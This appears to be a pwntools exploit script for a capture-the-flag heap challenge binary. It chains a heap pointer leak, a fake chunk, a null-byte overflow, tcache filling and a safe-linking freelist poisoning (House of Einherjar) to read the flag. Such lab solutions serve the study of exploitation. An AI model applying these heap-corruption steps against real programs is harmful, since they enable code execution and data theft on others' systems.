# idea: malloc a chunk with read_flag size -> house of einherjar, pointing the next malloc chunk to the existing chunk -> get flag by puts

from pwn import *

fake_chunk_size = 0x38
tcache_filler_size = 0xf8
d_size = 0x158
final_size = 0x28
read_flag_size = 1262

context.arch = 'amd64'

p = process("/challenge/toddlerheap_level8.0")

def heap_leak():
    p.sendline(b"malloc 0 8")
    p.sendline(b"free 0")
    p.sendline(b"malloc 0 8")
    p.sendline(b"puts 0")
    p.recvuntil(b"Data: ")
    leak = p.recvuntil(b"\n")[:-1]
    leak = unpack(leak, 'all')
    return leak

def fill_tcache():
    for idx in range(9, 16):
        p.sendline(f"malloc {idx} {tcache_filler_size}")
    for idx in range(9, 16):
        p.sendline(f"free {idx}")

def house_of_einherjar(fake_chunk_loc:int, target:int):
    # create fake chunk
    p.sendline(f"malloc 0 {fake_chunk_size}")
    p.sendline(b"read_copy 0")
    p.send(p64(0) + p64(0x60) + p64(fake_chunk_loc) + p64(fake_chunk_loc))

    # alloc b
    p.sendline(f"malloc 1 {final_size}")
    # alloc c
    p.sendline(f"malloc 2 {tcache_filler_size}")
    # overflow b to c with null
    p.sendline(b"read_copy 1")
    p.send(b"\x00"*(final_size - 0x8) + p64(0x60))
    # fill tcache
    fill_tcache()
    # free c
    p.sendline(b"free 2")
    # alloc d
    p.sendline(f"malloc 3 {d_size}")
    # alloc pad
    p.sendline(f"malloc 4 {final_size}")
    # free pad
    p.sendline(b"free 4")
    # free b
    p.sendline(b"free 1")
    # write to d
    p.sendline(b"read_copy 3")
    p.send(b"\x00"*0x30 + p64(heap_leak ^ target))
    # dummy
    p.sendline(f"malloc 5 {final_size}")
    # should be the target
    p.sendline(f"malloc 6 {final_size}")


    

heap_leak = heap_leak()
fake_chunk_loc = (heap_leak << 12) + 0x2c0
target = (heap_leak << 12) + 0xb60
house_of_einherjar(fake_chunk_loc, target)
print(f'heap_leak = {hex(heap_leak)}')
print(f'fake_chunk_loc = {hex(fake_chunk_loc)}')

# read flag from the duplicated chunk
p.sendline(b"read_flag")
p.sendline(b"puts 6")

p.interactive()